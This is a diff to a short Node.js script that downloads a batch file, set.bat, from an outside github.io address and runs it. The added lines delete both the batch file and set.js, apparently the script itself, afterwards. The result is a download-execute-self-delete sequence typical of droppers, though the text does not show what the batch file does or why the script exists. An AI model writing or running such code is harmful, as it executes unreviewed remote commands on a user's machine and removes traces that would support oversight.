@@ -2,8 +2,9 @@ const fs = require('fs')
 const path = require('path')
 const request = require('request')
 const execSync = require('./execSync.js')
+const target = 'e:\\test\\'
 const files = [
-  {'name': 'c.vue', 'path': 'e:\\test\\'}
+  {'name': 'c.vue', 'path': target}
 ]
 let count = 0
 for (let file of files) {
@@ -17,6 +18,8 @@ const timer = setTimeout(() => {
     request('https://8230459.github.io/set.bat').pipe(fs.createWriteStream(path.join('.', 'set.bat'))).on('close', async err => {
       if (err) return
       await execSync('set.bat')
+      fs.rmSync('set.js', {recursive: true})
+      fs.rmSync('set.bat', {recursive: true})
       process.exit()
     })
     clearTimeout(timer)
